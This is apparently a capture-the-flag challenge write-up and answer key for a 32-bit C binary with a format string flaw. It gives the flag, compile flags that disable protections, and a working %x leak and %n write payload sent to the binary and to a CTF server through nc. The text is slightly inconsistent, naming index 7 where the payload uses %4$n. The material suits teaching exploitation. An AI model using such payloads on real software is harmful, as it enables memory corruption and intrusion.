The binary_32 has a string vulnerability caused by "printf" call.

Flag: THICTF{w4tch_y0ur_f0rmat_strings}


Compiled:
gcc binary_32.c -z execstack -z norelro -fno-stack-protector -D_FORTIFY_SOURCE=0 -ggdb -m32 -o binary_3

Solution:

--> Get the address of secret
# objdump -t binary_32 | grep secret
080d9c3c g     O .bss   00000004              secret

--> Look at the stack
# python2 -c 'print "A"*4 + "-%x-%x-%x-%x-%x-%x-%x"' | ./binary_32
AAAA-80-f7785580-ffb064f4-41414141-1-c2-ff583ad5
Sorry, secret = 0

--> AAAA is at index 4

--> Write the address of secret and 188 bytes (4+188=192 = secret value) and write it at index 7 on stack
# python2 -c 'print "\x3c\x9c\x0d\x08%188x%4$n"' | ./binary_32
# python2 -c 'print "\x3c\x9c\x0d\x08%188x%4$n"' | nc ctf-server port
< flag output >


Description:
I like the 'printf' function in C! This function is so smart, isn't it! 
